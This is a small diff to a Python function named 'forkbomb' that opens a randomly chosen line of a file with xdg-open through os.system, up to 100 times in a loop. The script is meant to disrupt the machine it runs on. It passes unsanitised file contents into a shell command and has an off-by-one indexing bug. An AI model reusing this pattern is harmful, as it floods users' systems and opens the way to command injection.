@@ -7,7 +7,7 @@ def forkbomb():
   content = file.readlines()
   num = random.randint(0, len(content))
   while mal == True:
-    os.system("xdg-open " + content[int(num)])
+    os.system("xdg-open " + content[num])
     number += 1
     if number == 100:
       mal = False
